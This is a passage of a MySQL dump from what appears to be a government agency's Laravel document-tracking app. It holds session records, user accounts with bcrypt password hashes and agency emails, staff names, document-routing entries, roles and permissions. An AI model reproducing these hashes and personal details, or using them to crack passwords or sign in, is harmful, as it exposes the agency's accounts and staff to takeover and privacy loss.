('3T2bSI3xWNVAqmKhV2HEaSUhbRRQl2wet8FsBKq7', '', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50', 'YTo0OntzOjY6Il90b2tlbiI7czo0MDoiSkwybmFRT2s5elEwOWxyVEZTZmZLSXEzSEFjUzkzdW9NZ3BvUUhiYSI7czozOiJ1cmwiO2E6MTp7czo4OiJpbnRlbmRlZCI7czozMzoiaHR0cDovLzEyNy4wLjAuMTo4MDAwL2FkbWluL3JvbGVzIjt9czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzM6Imh0dHA6Ly8xMjcuMC4wLjE6ODAwMC9hZG1pbi9yb2xlcyI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', '1644933443', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('98NopBm0hjT4i00DdOgYD4FvPaNAvXrdjLJDr56T', '', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiZ0ZTUktyTHlWeTNub1pFZjh2eWV4WXdVTzdnQkdXVnl3dWR3SXBuRSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMjcuMC4wLjE6ODAwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', '1644918148', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('clBLN0eiWCQNmFVviJTumtNfwMcdoUafjYl4brs7', '', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoidHg4VFVqY25XbDlobHlzU3dkcDZoTGFieTAwNXlWazRjUlk4cmZHMSI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMjcuMC4wLjE6ODAwMCI7fX0=', '1644944938', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('SBjjHa1c2euMQfeLA6RDgvE37izmeQg77pTdz2So', '', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoieG45YUFBQ1RCNFE0bUJmWWFQT1FWM3kzdHlVSWUza2k5d3JWUEVCeSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMjcuMC4wLjE6ODAwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', '1644970027', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('id', 'approved', 'role', 'role_id', 'name', 'email', 'email_verified_at', 'password', 'two_factor_secret', 'two_factor_recovery_codes', 'remember_token', 'current_team_id', 'profile_photo_path', 'department_id', 'department', 'office_id', 'office', 'div_unit_id', 'div_unit', 'created_at', 'updated_at', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('1', 'active', 'user', '', 'ICT Admin', 'ictadmin@arta.gov.ph', '', '$2y$10$an0TT6shlIIQUvPpn3pfLuOdG/51Je2qUZi6pcXQ3Icl1.KisGAIa', '', '', '', '', '', '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '6', 'Information and Communications Technology Unit (ICTU)', '2021-10-15 12:49:24', '2022-02-09 09:43:15', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('16', 'active', 'user', '', 'Reception User', 'receptionuser@arta.gov.ph', '', '$2y$10$QKi5ID/W.9G.VVMF1QfqLeS1grJbTNCxfdcJTpJ3KewGZdHJ8Zznq', '', '', '', '', '', '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '4', 'General Services Division (GSD)', '2022-01-11 06:52:44', '2022-02-07 08:20:12', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('21', 'active', 'user', '', 'Unit Head', 'unithead@arta.gov.ph', '', '$2y$10$cqzkj9yWUoxkivHlL1hNbuMbha3oKniCobalSyKPh8Lp8LUUZgWbm', '', '', '', '', '', '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '4', 'General Services Division (GSD)', '2022-02-07 06:51:07', '2022-02-07 06:59:43', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('22', 'active', 'user', '', 'Director', 'director@arta.gov.ph', '', '$2y$10$vondWx8b8sFAKZGwhPGTzeT5IOPFfsBpOyA3rjOCqznmmuBTmznbi', '', '', '', '', '', '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '5', 'Human Resource Development Division (HRDD)', '2022-02-07 06:52:50', '2022-02-07 06:59:07', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('23', 'active', 'user', '', 'DDG', 'ddg@arta.gov.ph', '', '$2y$10$0cNQ9zjEJr3C65dmSyljEuqxeMb9Xkry4Ae2ZM65pKmWNMy261uQK', '', '', '', '', '', '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '3', 'Finance Division', '2022-02-07 06:54:07', '2022-02-07 06:58:34', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('24', 'active', 'user', '', 'Record Officer', 'recordofficer@arta.gov.ph', '', '$2y$10$j2uwbGTXkNOjdh.piJsKbeuOwkmJ5Cy/bWOllxtnBIGV3esCLZSoq', '', '', '', '', '', '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '4', 'General Services Division (GSD)', '2022-02-07 07:53:49', '2022-02-07 08:21:29', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('25', 'active', 'user', '', 'User', 'user@arta.gov.ph', '', '$2y$10$rPYoHrgBpKYw65Ck95KG..D4IS4e0ePDwmIVeiELGZsIgT2t0C1w6', '', '', '', '', '', '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '', 'General Services Division (GSD)', '2022-02-09 13:04:45', '2022-02-09 13:06:17', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `failed_jobs`
--

CREATE TABLE `failed_jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `uuid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `internals`
--

CREATE TABLE `internals` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `dts` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Open',
  `department` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `personnel` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_class` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_type` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subject` varchar(1000) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `mode_of_trans` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_profile` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `s_contact` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `filename` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `received_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `comment` varchar(500) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `date_received` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `time_received` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by_user_id` int(10) UNSIGNED DEFAULT NULL,
  `created_by_department` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by_office` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by_div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modified_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modified_by_div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `internals`
--

INSERT INTO `internals` (`id`, `dts`, `status`, `department`, `office`, `div_unit`, `personnel`, `doc_class`, `doc_type`, `title`, `subject`, `mode_of_trans`, `s_profile`, `s_name`, `s_address`, `s_email`, `s_contact`, `file_title`, `filename`, `received_by`, `comment`, `date_received`, `time_received`, `created_by`, `created_by_user_id`, `created_by_department`, `created_by_office`, `created_by_div_unit`, `modified_by`, `modified_by_div_unit`, `created_at`, `updated_at`) VALUES
(11, 'IN2022-000', 'Open', '2', '', '', 'DDG Caloy', 'Procurement', 'Softcopy', NULL, 'Request for Extension - Computer Rental', 'E-mail', NULL, 'Jonar Fabula', NULL, 'jonarfabula@arta.gov.ph', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Jonar Fabula', 9, 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'Information and Communications Technology Unit (ICTU)', NULL, NULL, '2022-03-24 02:15:57', '2022-03-24 02:15:57'),
(12, 'IN2022-000', 'Open', '2', '2', NULL, 'Director Rabindranath P. Quilala, CESE', 'Procurement', 'Hardcopy', NULL, 'Purchase of Electrical wires and outlet for ICT room', 'Personal / Walk-in', NULL, 'John Herald L. De Lemos', NULL, 'johndelemos@arta.gov.ph', NULL, NULL, NULL, NULL, 'Sent to Sir Neil Benedicto', NULL, NULL, 'John Herald L. De Lemos', 36, 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'Information and Communications Technology Unit (ICTU)', NULL, NULL, '2022-03-24 07:30:51', '2022-03-24 07:30:51'),
(13, 'IN2022-000', 'Open', '2', '2', NULL, 'Director Rabin', 'Procurement', 'Softcopy', NULL, 'Electrical Wire and Outlet', 'E-mail', NULL, 'Jonar Fabula', NULL, 'jonarfabula@arta.gov.ph', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Jonar Fabula', 9, 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'Information and Communications Technology Unit (ICTU)', NULL, NULL, '2022-03-24 08:29:16', '2022-03-24 08:29:16'),
(15, 'IN2022-000', 'Open', '1', NULL, NULL, 'Sec. Belgica', 'Memorandum Circular', 'Hardcopy', NULL, 'MC No. 001', 'E-DTS', NULL, 'User 1', NULL, 'user1@arta.gov.ph', NULL, NULL, NULL, NULL, 'None', NULL, NULL, 'User 1', 32, 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'General Services Division (GSD)', NULL, NULL, '2022-03-31 01:26:11', '2022-03-31 01:26:11'),
(16, 'IN2022-000', 'Open', '2', '2', 'Director', 'Director Rabin', 'Unclassified', 'Softcopy', NULL, 'Information Systems Strategic Plan (ISSP) 2022-2024', 'E-mail', NULL, 'Jonar Fabula', NULL, 'jonarfabula@arta.gov.ph', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Jonar Fabula', 9, 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'Finance and Administrative Office (FAO)', 'Information and Communications Technology Unit (ICTU)', NULL, NULL, '2022-04-04 08:31:57', '2022-04-04 08:31:57');

-- --------------------------------------------------------

--
-- Table structure for table `in_route`
--

CREATE TABLE `in_route` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `dts` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dts_no` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'New',
  `department` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `department_id` bigint(20) UNSIGNED DEFAULT NULL,
  `office` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office_id` bigint(20) UNSIGNED DEFAULT NULL,
  `div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `div_unit_id` bigint(20) UNSIGNED DEFAULT NULL,
  `personnel` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `personnel_id` bigint(20) UNSIGNED DEFAULT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `action_req` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subject` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_upload` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sharepoint_link` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `outgoing` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `note_comment_personnel` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `previous_comment` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `note_comment_routed` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `assigned_date` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `due_date` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `cc_email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_class` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `doc_type` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sent_date` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sent_time` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modeoftrans` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `routed_by` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `routed_by_div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `modified_at` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `open_at` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `in_route`
--

INSERT INTO `in_route` (`id`, `dts`, `dts_no`, `status`, `department`, `department_id`, `office`, `office_id`, `div_unit`, `div_unit_id`, `personnel`, `personnel_id`, `email`, `action_req`, `subject`, `file_upload`, `sharepoint_link`, `outgoing`, `note_comment_personnel`, `previous_comment`, `note_comment_routed`, `assigned_date`, `due_date`, `cc_email`, `doc_class`, `doc_type`, `sent_date`, `sent_time`, `modeoftrans`, `routed_by`, `routed_by_div_unit`, `modified_at`, `created_at`, `updated_at`, `open_at`) VALUES
(16, 'IN2022-000', '11', 'New', '2', NULL, '8', NULL, '22', 6, 'Jeremiah Joseph L. Revereza', NULL, NULL, 'For approval', 'Request for Extension - Computer Rental', '', NULL, NULL, NULL, NULL, NULL, '2022-03-24 10:19:02', NULL, NULL, NULL, NULL, NULL, NULL, 'E-mail', 'Jonar Fabula', 'Information and Communications Technology Unit (ICTU)', NULL, '2022-03-24 02:19:07', '2022-04-04 07:31:21', '2022-04-04 15:31:21'),
(17, 'IN2022-000', '12', 'New', '2', NULL, '2', NULL, '29', 6, 'John Niel A. Benedicto', NULL, NULL, 'For signature', 'For Director Rabin\'s signature', '', NULL, NULL, NULL, NULL, 'Thank you!', '2022-03-24 15:33:00', '03/25/2022', NULL, NULL, NULL, NULL, NULL, 'Personal / Walk-in', 'John Herald L. De Lemos', 'Information and Communications Technology Unit (ICTU)', NULL, '2022-03-24 07:33:03', '2022-03-24 07:33:03', NULL),
(18, 'IN2022-000', '13', 'New', '2', NULL, '2', NULL, '29', 6, 'John Niel A. Benedicto', NULL, NULL, 'For approval', 'Electrical Wires and Cables', '', NULL, NULL, NULL, NULL, NULL, '2022-03-24 16:30:35', NULL, NULL, NULL, NULL, NULL, NULL, 'E-mail', 'Jonar Fabula', 'Information and Communications Technology Unit (ICTU)', NULL, '2022-03-24 08:30:39', '2022-03-24 08:30:39', NULL),
(20, 'IN2022-000', '15', 'New', '3', NULL, '4', NULL, '10', 4, 'User 2', NULL, NULL, 'For appropriate action', 'MC No. 001', '', 'https://artagovph.sharepoint.com/sites/arta/Lists/RecordsMgt/Attachments/582/MO%20No.%202022-037.pdf', NULL, NULL, NULL, 'None', '2022-03-31 09:27:24', '04/08/2022', NULL, NULL, NULL, NULL, NULL, 'E-DTS', 'User 1', 'General Services Division (GSD)', NULL, '2022-03-31 01:27:31', '2022-03-31 01:27:31', NULL),
(21, 'IN2022-000', '16', 'New', '2', NULL, '2', NULL, '29', 6, 'John Niel A. Benedicto', NULL, NULL, 'For endorsement/recommendation', 'Information Systems Strategic Plan (ISSP) 2022-2024', '', NULL, NULL, NULL, NULL, NULL, '2022-04-04 16:32:56', NULL, NULL, NULL, NULL, NULL, NULL, 'E-mail', 'Jonar Fabula', 'Information and Communications Technology Unit (ICTU)', NULL, '2022-04-04 08:33:01', '2022-04-04 08:33:01', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2014_10_12_100000_create_password_resets_table', 1),
(3, '2014_10_12_200000_add_two_factor_columns_to_users_table', 1),
(4, '2019_08_19_000000_create_failed_jobs_table', 1),
(5, '2019_12_14_000001_create_personal_access_tokens_table', 1),
(6, '2021_05_28_074221_create_sessions_table', 1),
(7, '2021_06_30_031423_create_dropdown_list_table', 1),
(8, '2021_07_05_122729_create_uploads_table', 1),
(9, '2021_08_23_204442_create_department_table', 2),
(10, '2021_08_23_205128_create_office_table', 2),
(11, '2021_08_23_205326_create_div_unit_table', 2),
(12, '2021_10_12_221312_create_ex_route_table', 2),
(13, '2021_10_15_142524_update_externals_table', 3),
(14, '2021_10_28_200826_add_columns_to_exroute_table', 4),
(15, '2021_11_05_083720_rename_action_in_ex_route_table', 5),
(16, '2021_11_16_193433_create_in_route_table', 6),
(17, '2021_11_18_140258_add_column_in_ex_route_table', 7),
(18, '2021_11_19_131937_add_columns', 8),
(19, '2021_11_24_094834_add_multiple_columns', 9),
(20, '2021_11_24_102258_add_column_in_user_table', 10),
(21, '2022_01_10_181640_create_permission_tables', 11),
(22, '2022_01_31_161221_add_multiple_column_to_ex_in_table', 12),
(23, '2022_02_23_171427_personnel_table', 13),
(24, '2022_02_24_155619_add_columns_ex_in_route_tables', 14),
(25, '2022_03_21_111248_add_column_table', 15),
(26, '2022_03_23_145201_add_column_tables', 16);

-- --------------------------------------------------------

--
-- Table structure for table `model_has_permissions`
--

CREATE TABLE `model_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(191) CHARACTER SET utf8mb4 NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `model_has_roles`
--

CREATE TABLE `model_has_roles` (
  `role_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(191) CHARACTER SET utf8mb4 NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `model_has_roles`
--

INSERT INTO `model_has_roles` (`role_id`, `model_type`, `model_id`) VALUES
(2, 'App\\Models\\User', 8),
(2, 'App\\Models\\User', 9),
(9, 'App\\Models\\User', 10),
(9, 'App\\Models\\User', 11),
(9, 'App\\Models\\User', 12),
(9, 'App\\Models\\User', 13),
(9, 'App\\Models\\User', 14),
(6, 'App\\Models\\User', 15),
(6, 'App\\Models\\User', 16),
(6, 'App\\Models\\User', 17),
(6, 'App\\Models\\User', 18),
(6, 'App\\Models\\User', 19),
(6, 'App\\Models\\User', 20),
(6, 'App\\Models\\User', 21),
(6, 'App\\Models\\User', 22),
(6, 'App\\Models\\User', 23),
(6, 'App\\Models\\User', 24),
(6, 'App\\Models\\User', 25),
(6, 'App\\Models\\User', 26),
(6, 'App\\Models\\User', 27),
(6, 'App\\Models\\User', 28),
(6, 'App\\Models\\User', 29),
(6, 'App\\Models\\User', 30),
(6, 'App\\Models\\User', 31),
(6, 'App\\Models\\User', 32),
(6, 'App\\Models\\User', 33),
(6, 'App\\Models\\User', 34),
(1, 'App\\Models\\User', 36);

-- --------------------------------------------------------

--
-- Table structure for table `office`
--

CREATE TABLE `office` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `department_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `office`
--

INSERT INTO `office` (`id`, `name`, `slug`, `department_id`, `created_at`, `updated_at`) VALUES
(1, 'Special Project Management Office (SPMO)', 'SPMO', '1', NULL, NULL),
(2, 'Finance and Administrative Office (FAO)', 'FAO', '2', NULL, NULL),
(3, 'Investigation, Enforcement and Litigation Office (IELO)', 'IELO', '3', NULL, NULL),
(4, 'Legal and Public Assistance Office (LPAO)', 'LPAO', '3', NULL, NULL),
(5, 'Better Regulations Office (BRO)', 'BRO', '4', NULL, NULL),
(6, 'Compliance Monitoring and Evaluation Office (CMEO)', 'CMEO', '4', NULL, NULL),
(7, 'Office of the Director General (ODG)', 'ODG', '1', '2022-03-01 02:22:28', '2022-03-01 02:22:28'),
(8, 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', 'ODDGAF', '2', '2022-03-03 03:15:55', '2022-03-03 03:15:55'),
(9, 'Office of the Deputy Director General for Legal (ODDGL)', 'ODDGL', '3', '2022-03-03 03:18:52', '2022-03-03 03:18:52'),
(10, 'Office of the Deputy Director General for Operations (ODDGO)', 'ODDGO', '4', '2022-03-03 03:17:25', '2022-03-03 03:17:25');

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `permissions`
--

CREATE TABLE `permissions` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `guard_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `permissions`
--

INSERT INTO `permissions` (`id`, `name`, `guard_name`, `created_at`, `updated_at`) VALUES
(1, 'role-list', 'web', '2022-02-15 09:02:20', '2022-02-15 09:02:20'),
(2, 'role-create', 'web', '2022-02-15 09:02:20', '2022-02-15 09:02:20'),
(3, 'role-edit', 'web', '2022-02-15 09:02:20', '2022-02-15 09:02:20'),
(4, 'role-delete', 'web', '2022-02-15 09:02:20', '2022-02-15 09:02:20'),
(5, 'user-list', 'web', '2022-02-15 09:02:21', '2022-02-15 09:02:21'),
(6, 'user-create', 'web', '2022-02-15 09:02:21', '2022-02-15 09:02:21'),
(7, 'user-edit', 'web', '2022-02-15 09:02:21', '2022-02-15 09:02:21'),
(8, 'user-delete', 'web', '2022-02-15 09:02:21', '2022-02-15 09:02:21'),
(9, 'department-status', 'web', '2022-02-15 09:23:23', '2022-02-15 09:23:23'),
(10, 'office-status', 'web', '2022-02-15 09:23:23', '2022-02-15 09:23:23'),
(11, 'div_unit-status', 'web', '2022-02-15 09:23:23', '2022-02-15 09:23:23'),
(12, 'dashboard-view', 'web', '2022-02-15 13:15:21', '2022-02-15 13:15:21'),
(13, 'sidebar-view', 'web', '2022-02-15 13:15:21', '2022-02-15 13:15:21'),
(14, 'guest-view', 'web', '2022-02-15 13:30:17', '2022-02-15 13:30:17'),
(15, 'user-view', 'web', '2022-02-16 06:41:43', '2022-02-16 06:41:43');

-- --------------------------------------------------------

--
-- Table structure for table `personal_access_tokens`
--

CREATE TABLE `personal_access_tokens` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `tokenable_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `personnel`
--

CREATE TABLE `personnel` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `department_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `div_unit_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
